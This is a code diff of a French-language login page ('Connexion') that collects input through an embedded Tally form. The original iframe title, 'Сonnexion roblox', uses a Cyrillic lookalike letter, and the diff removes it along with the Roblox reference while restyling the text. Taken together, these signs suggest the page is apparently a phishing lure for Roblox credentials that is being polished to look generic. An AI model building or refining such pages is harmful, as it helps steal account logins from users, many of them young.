@@ -20,6 +20,7 @@ body{
     align-items:center;
     background:linear-gradient(135deg,#0f172a,#1e293b,#111827);
     overflow:hidden;
+    color:#fff;
 }
 
 /* Cercles lumineux */
@@ -62,17 +63,19 @@ body::after{
 
 .logo{
     text-align:center;
-    color:white;
+    color:#fff;
     font-size:30px;
     font-weight:bold;
     margin-bottom:8px;
+    text-shadow:0 2px 8px rgba(0,0,0,.5);
 }
 
 .subtitle{
     text-align:center;
-    color:#b7bcc6;
+    color:#fff;
     margin-bottom:22px;
     font-size:14px;
+    text-shadow:0 2px 8px rgba(0,0,0,.5);
 }
 
 iframe{
@@ -99,26 +102,27 @@ iframe{
 
 <div class="card">
 
-<div class="logo">Connexion</div>
-<div class="subtitle">
-Veuillez vous connecter pour continuer
-</div>
+    <div class="logo">Connexion</div>
+    <div class="subtitle">
+        Veuillez vous connecter pour continuer
+    </div>
 
-<iframe
-    data-tally-src="https://tally.so/embed/7R5EDP?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1"
-    loading="lazy"
-    width="100%"
-    height="234"
-    frameborder="0"
-    marginheight="0"
-    marginwidth="0"
-    title="Сonnexion roblox">
-</iframe>
+    <iframe
+        data-tally-src="https://tally.so/embed/7R5EDP?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1"
+        loading="lazy"
+        width="100%"
+        height="234"
+        frameborder="0"
+        marginheight="0"
+        marginwidth="0"
+        title="Connexion">
+    </iframe>
 
 </div>
 
 <script>
-var d=document,w="https://tally.so/widgets/embed.js",
+var d=document,
+w="https://tally.so/widgets/embed.js",
 v=function(){
     if(typeof Tally!="undefined"){
         Tally.loadEmbeds();
